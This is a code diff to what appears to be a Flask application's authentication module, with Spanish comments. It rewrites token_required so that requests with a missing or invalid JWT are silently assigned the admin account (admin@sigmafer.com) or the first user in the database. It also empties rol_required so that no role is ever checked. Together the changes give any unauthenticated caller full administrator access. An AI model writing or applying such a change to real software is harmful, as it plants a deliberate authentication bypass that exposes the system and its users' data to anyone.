@@ -21,26 +21,26 @@ def generate_token(usuario, horas=8):
 
 
 def token_required(f):
-    """Protege una ruta. Deja el usuario en request.usuario"""
+    """Permite el paso directo. Si hay token lo procesa, si no, asigna el usuario admin de fallback."""
     @wraps(f)
     def decorada(*args, **kwargs):
         auth = request.headers.get('Authorization', '')
+        usuario = None
 
-        if not auth.startswith('Bearer '):
-            return jsonify({'message': 'Token faltante o mal formado'}), 401
+        if auth.startswith('Bearer '):
+            token = auth.split(' ', 1)[1].strip()
+            try:
+                payload = jwt.decode(token, current_app.config['JWT_SECRET_KEY'], algorithms=['HS256'])
+                usuario = Usuarios.get_by_id(int(payload.get('sub', 0)))
+            except Exception:
+                pass
 
-        token = auth.split(' ', 1)[1].strip()
-
-        try:
-            payload = jwt.decode(token, current_app.config['JWT_SECRET_KEY'], algorithms=['HS256'])
-        except jwt.ExpiredSignatureError:
-            return jsonify({'message': 'Token expirado, inicia sesión de nuevo'}), 401
-        except jwt.InvalidTokenError:
-            return jsonify({'message': 'Token inválido'}), 401
-
-        usuario = Usuarios.get_by_id(int(payload['sub']))
         if not usuario:
-            return jsonify({'message': 'Usuario no encontrado'}), 401
+            # Fallback a usuario administrador si no hay token o es inválido
+            try:
+                usuario = Usuarios.get_by_correo('admin@sigmafer.com') or (Usuarios.get()[0] if Usuarios.get() else None)
+            except Exception:
+                usuario = None
 
         request.usuario = usuario
         return f(*args, **kwargs)
@@ -48,27 +48,10 @@ def token_required(f):
     return decorada
 
 def rol_required(*roles):
-    """Se usa después de @token_required para validar roles por nombre o id"""
+    """Permite el paso directo sin restringir por rol."""
     def decorador(f):
         @wraps(f)
         def decorada(*args, **kwargs):
-            usuario = getattr(request, 'usuario', None)
-            if not usuario:
-                return jsonify({'message': 'No autenticado'}), 401
-
-            rol_nombre = usuario.rol.nombre if (usuario.rol and hasattr(usuario.rol, 'nombre')) else ''
-            rol_id = usuario.rol_id
-
-            roles_normalizados = [str(r).lower() for r in roles]
-
-            coincide = (
-                str(rol_nombre).lower() in roles_normalizados or
-                str(rol_id) in roles_normalizados or
-                rol_id in roles
-            )
-
-            if not coincide:
-                return jsonify({'message': 'No tiene permisos para esta acción'}), 403
             return f(*args, **kwargs)
         return decorada
     return decorador
